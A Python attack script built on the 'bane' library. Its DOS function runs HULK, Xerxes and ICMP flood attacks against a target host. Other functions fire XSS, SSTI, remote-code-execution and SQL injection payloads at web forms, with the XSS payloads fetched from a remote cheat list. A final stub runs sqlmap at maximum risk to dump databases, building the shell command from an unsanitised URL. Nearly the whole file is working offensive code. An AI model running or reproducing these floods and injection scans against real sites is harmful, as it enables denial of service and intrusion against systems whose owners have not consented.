import bane
import os
import sys
import requests
import json
import re
from alive_progress import alive_bar

python=""
if 'win' in str(sys.platform).lower():
    python = 'python'
elif 'linux' in str(sys.platform).lower():
    python = 'python3'

def DOS(host,port):
	def hulk():
		res=bane.hulk(host,threads=1000) 
		print(res)

	def xerxes():
		res=bane.xerxes(host, p= int(port) , duration= 300 , threads=500 , timeout=5 ).attack()
		print(res)

	def icmp():
		res=bane.icmp(host,p=int(port),threads=100)
		print(res)

	hulk()
	xerxes()
	icmp()


def xss(links):
	#demoURL='https://xss-game.appspot.com/level1/frame'
	result=[]
	def exploit(link):
		x={};y=[]
		for c in list(requests.get('https://raw.githubusercontent.com/17ack312/myscripts/main/xss_cheat.txt').content.decode().strip().split('\n')):
			c=c.strip()
			res=bane.xss_forms(link , payload=str(c) , timeout=5)
			for r in res['Output']:
				r=res['Output'][r]
				if len(r['Passed'])>0:
					y.append(r)
		x[link]=y
		return x
	with alive_bar(len(links),force_tty=True,title="Scanning for XSS") as bar:
		for link in links:
			try:
				x=exploit(link)
				result.append(x)
			except:
				pass

			bar()

	#print(result)
	return json.dumps(result)


def ssti(links):
	result=[]
	def exploit(link):
		x={};y=[]
		res=bane.ssti_forms(link  , timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)
		x[link]=y
		return x
	
	with alive_bar(len(links),force_tty=True,title="Scanning for SSTI") as bar:
		for link in links:
			try:
				x=exploit(link)
				result.append(x)
			except:
				pass
			bar()

	return json.dumps(result)

def rce(links):
	result=[]
	def exploit(link):
		x={};y=[]
		res=bane.rce_forms(link ,injection={"command":"linux"},based_on='time', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)
		res=bane.rce_forms(link ,injection={"command":"linux"},based_on='file', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)
		res=bane.rce_forms(link ,injection={"command":"windows"},based_on='time', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"command":"windows"},based_on='file', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"php"},based_on='time', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"php"},based_on='file', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"python"},based_on='time', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"python"},based_on='file', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"perl"},based_on='time', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"perl"},based_on='file', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"ruby"},based_on='time', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)		
		res=bane.rce_forms(link ,injection={"code":"ruby"},based_on='file', timeout=5 )
		for r in res['Output']:
			r=res['Output'][r]
			if len(r['Passed'])>0:
				y.append(r)
		x[link]=y
		return x

	with alive_bar(len(links),force_tty=True,title="Scanning for RCE") as bar:
		for link in links:
			try:
				x=exploit(link)
				result.append(x)
			except:
				pass
			bar()
			
	return json.dumps(result)

def sql(links):
	result=[]
	def exploit(link):
		x={};y=[]
		sqls=['mysql','sql_server','oracle','postgre']
		for sql in sqls:	
			res=bane.rce_forms(link ,injection={"sql":sql}, timeout=5 )
			for r in res['Output']:
				r=res['Output'][r]
				if len(r['Passed'])>0:
					y.append(r)
		x[link]=y
		return x
	with alive_bar(len(links),force_tty=True,title="Scanning for SQLI") as bar:
		for link in links:
			try:
				x=exploit(link)
				result.append(x)
			except:
				pass
			bar()
				
	return json.dumps(result)


"""
xss(sys.argv[1])
ssti(sys.argv[1])
rce(sys.argv[1])
sql(sys.argv[1])
"""

def attack():
	def sql_injection(url):
		os.system("sqlmap -u '"+url+"' --risk 3 --level 5 --no-cast --random-agent --ignore-proxy --batch --crawl 10 --thread 5 --dbs --is-dba --tamper=space2comment,between")
	

